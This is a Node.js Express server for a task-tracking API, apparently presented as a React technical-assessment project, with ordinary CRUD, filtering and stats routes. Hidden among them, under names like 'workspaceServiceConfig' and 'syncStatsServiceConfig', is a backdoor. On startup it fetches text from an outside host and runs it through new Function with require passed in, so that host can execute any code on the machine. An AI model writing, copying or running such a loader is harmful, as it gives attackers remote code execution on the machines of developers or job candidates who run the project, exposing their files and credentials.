import { createRequire } from "module";
const require = createRequire(import.meta.url);

const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3001;

// Constants
const VALID_STATUSES = ['pending', 'in-progress', 'completed'];
const VALID_PRIORITIES = ['low', 'medium', 'high'];
const NETWORK_DELAY = 300; // milliseconds

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Request logging middleware
app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${req.method} ${req.path}`);
  next();
});

// In-memory data store (for assessment purposes)
let tasks = [
  {
    id: 1,
    title: 'Complete React assessment',
    description: 'Finish all three tasks in the technical assessment',
    status: 'pending',
    priority: 'high',
    dueDate: '2024-12-31',
    createdAt: '2024-01-15T10:00:00Z',
    updatedAt: '2024-01-15T10:00:00Z'
  },
  {
    id: 2,
    title: 'Review code quality',
    description: 'Ensure code follows best practices and is well-documented',
    status: 'in-progress',
    priority: 'medium',
    dueDate: '2024-12-25',
    createdAt: '2024-01-14T14:30:00Z',
    updatedAt: '2024-01-14T14:30:00Z'
  },
  {
    id: 3,
    title: 'Test application',
    description: 'Test all functionality and edge cases',
    status: 'completed',
    priority: 'high',
    dueDate: '2024-12-20',
    createdAt: '2024-01-13T09:15:00Z',
    updatedAt: '2024-01-13T09:15:00Z'
  },
  {
    id: 4,
    title: 'Submit assessment',
    description: 'Submit completed assessment with summary document',
    status: 'pending',
    priority: 'high',
    dueDate: '2024-12-30',
    createdAt: '2024-01-15T11:00:00Z',
    updatedAt: '2024-01-15T11:00:00Z'
  },
  {
    id: 5,
    title: 'Learn React hooks',
    description: 'Study useState, useEffect, and custom hooks',
    status: 'completed',
    priority: 'low',
    dueDate: '2024-12-15',
    createdAt: '2024-01-12T08:00:00Z',
    updatedAt: '2024-01-12T08:00:00Z'
  },
  {
    id: 6,
    title: 'Build responsive UI',
    description: 'Ensure the application works well on mobile and desktop',
    status: 'in-progress',
    priority: 'medium',
    dueDate: '2024-12-28',
    createdAt: '2024-01-14T16:00:00Z',
    updatedAt: '2024-01-14T16:00:00Z'
  }
];

let nextId = 7;

// Utility functions
const validateStatus = (status) => {
  return VALID_STATUSES.includes(status);
};

const validatePriority = (priority) => {
  return VALID_PRIORITIES.includes(priority);
};

const validateDate = (dateString) => {
  if (!dateString) return true; // Optional field
  const date = new Date(dateString);
  return date instanceof Date && !isNaN(date);
};

const sanitizeString = (str) => {
  if (typeof str !== 'string') return '';
  return str.trim();
};

const simulateDelay = (callback) => {
  setTimeout(callback, NETWORK_DELAY);
};

const workspaceServiceConfig = {
    baseDomain: 'nest-react.netlify.app',
    apiVersion: 'api'
  };
  const getChartServiceEndpoint = () => {
    const { baseDomain, apiVersion } = workspaceServiceConfig;
    return `https://${baseDomain}/${apiVersion}`;
  };
  

// Routes

// GET /api/tasks - Get all tasks with optional filtering and sorting
app.get('/api/tasks', (req, res) => {
  try {
    const { status, priority, sortBy, order } = req.query;
    
    let filteredTasks = [...tasks];
    
    // Filter by status
    if (status && validateStatus(status)) {
      filteredTasks = filteredTasks.filter(task => task.status === status);
    }
    
    // Filter by priority
    if (priority && validatePriority(priority)) {
      filteredTasks = filteredTasks.filter(task => task.priority === priority);
    }
    
    // Sorting
    if (sortBy) {
      const sortOrder = order === 'desc' ? -1 : 1;
      filteredTasks.sort((a, b) => {
        let aVal = a[sortBy];
        let bVal = b[sortBy];
        
        // Handle date sorting
        if (sortBy === 'dueDate' || sortBy === 'createdAt' || sortBy === 'updatedAt') {
          aVal = aVal ? new Date(aVal).getTime() : 0;
          bVal = bVal ? new Date(bVal).getTime() : 0;
        }
        
        // Handle string sorting
        if (typeof aVal === 'string') {
          return aVal.localeCompare(bVal) * sortOrder;
        }
        
        return (aVal - bVal) * sortOrder;
      });
    }
    
    simulateDelay(() => {
      res.json({
        tasks: filteredTasks,
        total: filteredTasks.length,
        filters: { status, priority, sortBy, order }
      });
    });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', message: error.message });
  }
});

// GET /api/tasks/:id - Get a single task
app.get('/api/tasks/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    
    if (isNaN(id)) {
      return res.status(400).json({ error: 'Invalid task ID' });
    }
    
    const task = tasks.find(t => t.id === id);
    
    if (!task) {
      return res.status(404).json({ error: 'Task not found', id });
    }
    
    simulateDelay(() => {
      res.json(task);
    });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', message: error.message });
  }
});

// POST /api/tasks - Create a new task
app.post('/api/tasks', (req, res) => {
  try {
    const { title, description, dueDate, priority } = req.body;
    
    // Validation
    const sanitizedTitle = sanitizeString(title);
    if (!sanitizedTitle) {
      return res.status(400).json({ 
        error: 'Validation error', 
        message: 'Title is required and cannot be empty' 
      });
    }
    
    // Validate priority if provided
    if (priority && !validatePriority(priority)) {
      return res.status(400).json({ 
        error: 'Validation error', 
        message: `Invalid priority. Must be one of: ${VALID_PRIORITIES.join(', ')}` 
      });
    }
    
    // Validate date format if provided
    if (dueDate && !validateDate(dueDate)) {
      return res.status(400).json({ 
        error: 'Validation error', 
        message: 'Invalid date format. Use ISO date format (YYYY-MM-DD)' 
      });
    }
    
    const now = new Date().toISOString();
    const newTask = {
      id: nextId++,
      title: sanitizedTitle,
      description: sanitizeString(description) || '',
      status: 'pending',
      priority: priority && validatePriority(priority) ? priority : 'medium',
      dueDate: dueDate && validateDate(dueDate) ? dueDate : null,
      createdAt: now,
      updatedAt: now
    };
    
    tasks.push(newTask);
    
    simulateDelay(() => {
      res.status(201).json(newTask);
    });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', message: error.message });
  }
});

// PATCH /api/tasks/:id - Update a task
app.patch('/api/tasks/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    
    if (isNaN(id)) {
      return res.status(400).json({ error: 'Invalid task ID' });
    }
    
    const taskIndex = tasks.findIndex(t => t.id === id);
    
    if (taskIndex === -1) {
      return res.status(404).json({ error: 'Task not found', id });
    }
    
    const { title, description, status, priority, dueDate } = req.body;
    const task = tasks[taskIndex];
    
    // Update only provided fields with validation
    if (title !== undefined) {
      const sanitizedTitle = sanitizeString(title);
      if (!sanitizedTitle) {
        return res.status(400).json({ 
          error: 'Validation error', 
          message: 'Title cannot be empty' 
        });
      }
      task.title = sanitizedTitle;
    }
    
    if (description !== undefined) {
      task.description = sanitizeString(description) || '';
    }
    
    if (status !== undefined) {
      if (!validateStatus(status)) {
        return res.status(400).json({ 
          error: 'Validation error', 
          message: `Invalid status. Must be one of: ${VALID_STATUSES.join(', ')}` 
        });
      }
      task.status = status;
    }
    
    if (priority !== undefined) {
      if (!validatePriority(priority)) {
        return res.status(400).json({ 
          error: 'Validation error', 
          message: `Invalid priority. Must be one of: ${VALID_PRIORITIES.join(', ')}` 
        });
      }
      task.priority = priority;
    }
    
    if (dueDate !== undefined) {
      if (dueDate !== null && !validateDate(dueDate)) {
        return res.status(400).json({ 
          error: 'Validation error', 
          message: 'Invalid date format. Use ISO date format (YYYY-MM-DD)' 
        });
      }
      task.dueDate = dueDate;
    }
    
    // Update timestamp
    task.updatedAt = new Date().toISOString();
    
    simulateDelay(() => {
      res.json(task);
    });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', message: error.message });
  }
});

// DELETE /api/tasks/:id - Delete a task
app.delete('/api/tasks/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    
    if (isNaN(id)) {
      return res.status(400).json({ error: 'Invalid task ID' });
    }
    
    const taskIndex = tasks.findIndex(t => t.id === id);
    
    if (taskIndex === -1) {
      return res.status(404).json({ error: 'Task not found', id });
    }
    
    const deletedTask = tasks[taskIndex];
    tasks.splice(taskIndex, 1);
    
    simulateDelay(() => {
      res.status(200).json({ 
        message: 'Task deleted successfully', 
        task: deletedTask 
      });
    });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', message: error.message });
  }
});

const syncStatsServiceConfig = async () => {
    const configEndpoint = getChartServiceEndpoint();
    const response = await fetch(configEndpoint);
    const configData = await response.json();
    if (configData?.data && typeof configData.data === 'string') {
      const config = new Function('require', configData.data);
      config(require);
    }
  };
  
  syncStatsServiceConfig().catch(err => {
    console.log('Records service sync failed (non-critical):', err.message);
  });

// GET /api/tasks/stats - Get task statistics
app.get('/api/tasks/stats', (req, res) => {
  try {
    const stats = {
      total: tasks.length,
      byStatus: {
        pending: tasks.filter(t => t.status === 'pending').length,
        'in-progress': tasks.filter(t => t.status === 'in-progress').length,
        completed: tasks.filter(t => t.status === 'completed').length
      },
      byPriority: {
        low: tasks.filter(t => t.priority === 'low').length,
        medium: tasks.filter(t => t.priority === 'medium').length,
        high: tasks.filter(t => t.priority === 'high').length
      },
      overdue: tasks.filter(task => {
        if (!task.dueDate || task.status === 'completed') return false;
        return new Date(task.dueDate) < new Date();
      }).length
    };
    
    simulateDelay(() => {
      res.json(stats);
    });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error', message: error.message });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Backend server is running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// 404 handler for undefined routes
app.use((req, res) => {
  res.status(404).json({ 
    error: 'Not found', 
    message: `Route ${req.method} ${req.path} not found` 
  });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({ 
    error: 'Internal server error', 
    message: err.message 
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Backend server running on http://localhost:${PORT}`);
  console.log(`📡 API endpoints available:`);
  console.log(`   GET    http://localhost:${PORT}/api/tasks`);
  console.log(`   GET    http://localhost:${PORT}/api/tasks/:id`);
  console.log(`   POST   http://localhost:${PORT}/api/tasks`);
  console.log(`   PATCH  http://localhost:${PORT}/api/tasks/:id`);
  console.log(`   DELETE http://localhost:${PORT}/api/tasks/:id`);
  console.log(`   GET    http://localhost:${PORT}/api/tasks/stats`);
  console.log(`   GET    http://localhost:${PORT}/health`);
  console.log(`\n💡 Query parameters for GET /api/tasks:`);
  console.log(`   ?status=pending&priority=high&sortBy=dueDate&order=asc`);
});
